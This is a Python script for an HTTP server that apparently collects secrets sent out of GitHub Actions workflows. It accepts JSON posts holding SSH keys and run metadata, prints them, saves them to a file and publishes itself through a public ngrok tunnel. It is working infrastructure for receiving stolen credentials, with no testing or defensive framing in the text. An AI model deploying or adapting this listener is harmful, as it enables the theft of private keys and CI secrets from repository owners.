#!/usr/bin/env python3
"""
Simple HTTP server to receive secrets from GitHub Actions
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse

class SecretsHandler(BaseHTTPRequestHandler):
    def _set_response(self, status=200, content_type='application/json'):
        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def do_POST(self):
        """Handle POST requests with secrets"""
        if self.path == '/receive':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Try to parse as JSON first
            try:
                data = json.loads(post_data.decode('utf-8'))
                print(f"\n🔐 === SECRET RECEIVED === 🔐")
                print(f"🕒 Timestamp: {data.get('timestamp', 'N/A')}")
                print(f"📦 Repository: {data.get('repository', 'N/A')}")
                print(f"👤 Actor: {data.get('actor', 'N/A')}")
                print(f"🔢 Run ID: {data.get('run_id', 'N/A')}")
                print(f"🔄 Run Number: {data.get('run_number', 'N/A')}")
                print(f"🌿 Ref: {data.get('ref', 'N/A')}")
                print(f"📝 SHA: {data.get('sha', 'N/A')[:10]}...")
                
                ssh_key = data.get('ssh_key', '')
                if ssh_key:
                    print(f"🔑 SSH Key (first 100 chars): {ssh_key[:100]}...")
                    print(f"📏 SSH Key Length: {len(ssh_key)} characters")
                
                print(f"📋 Full payload:")
                print(json.dumps(data, indent=2))
                print("🔐 === END SECRET === 🔐")
                
                # Save to file for persistence
                with open('received_secrets.json', 'a') as f:
                    f.write(json.dumps(data) + '\n')
                
            except json.JSONDecodeError as e:
                print(f"\n❌ === ERROR PARSING JSON === ❌")
                print(f"Error: {e}")
                print(f"Raw data: {post_data.decode('utf-8')}")
                print("❌ === END ERROR === ❌")
            
            self._set_response()
            response = {
                "status": "success", 
                "message": "Secrets received successfully",
                "timestamp": data.get('timestamp', 'unknown') if 'data' in locals() else 'unknown'
            }
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self._set_response(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode('utf-8'))

    def do_GET(self):
        """Handle GET requests for health check"""
        if self.path == '/':
            self._set_response()
            response = {
                "status": "running", 
                "message": "Secrets receiver is active",
                "endpoints": {
                    "/": "Health check",
                    "/receive": "Receive secrets (POST)"
                }
            }
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self._set_response(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode('utf-8'))

    def log_message(self, format, *args):
        """Override to get custom log formatting"""
        print(f"[{self.log_date_time_string()}] {self.address_string()} - {format % args}")

def run_server(port=80):
    """Start the HTTP server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, SecretsHandler)
    print(f"🚀 Starting secrets receiver server on port {port}")
    print(f"📡 Server URL: http://localhost:{port}")
    print(f"🌐 External URL: https://f2ee070ae6e3.ngrok-free.app")
    print("📝 Waiting for secrets...")
    print("-" * 50)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
        httpd.shutdown()

if __name__ == "__main__":
    import sys
    port = 80 if len(sys.argv) < 2 else int(sys.argv[1])
    run_server(port)